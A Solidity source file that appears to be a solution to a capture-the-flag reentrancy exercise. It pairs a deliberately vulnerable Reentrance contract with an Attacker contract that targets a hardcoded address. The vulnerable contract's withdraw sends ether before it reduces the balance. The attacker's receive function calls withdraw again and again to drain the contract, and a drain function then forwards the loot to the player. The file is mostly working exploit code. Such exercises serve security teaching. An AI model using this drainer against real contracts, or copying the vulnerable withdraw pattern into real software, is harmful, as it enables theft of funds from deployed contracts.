// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol"; 

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Attacker {

    Reentrance instance = Reentrance(0xF0Db00D4f177e935922dC55e942b6e5A2F9be92c);
    uint256 public amount = 500000000000000; // 0.0005 ETH
    address payable player;

    constructor() public payable {
        player = msg.sender;
    }

    receive() external payable {
        if (address(instance).balance != 0 ) {
            instance.withdraw(amount);
        }
    }

    function donate() public {
        instance.donate{value: amount}(address(this));
    }

    function drain() public {
        instance.withdraw(amount);
        player.transfer(address(this).balance);
    }
}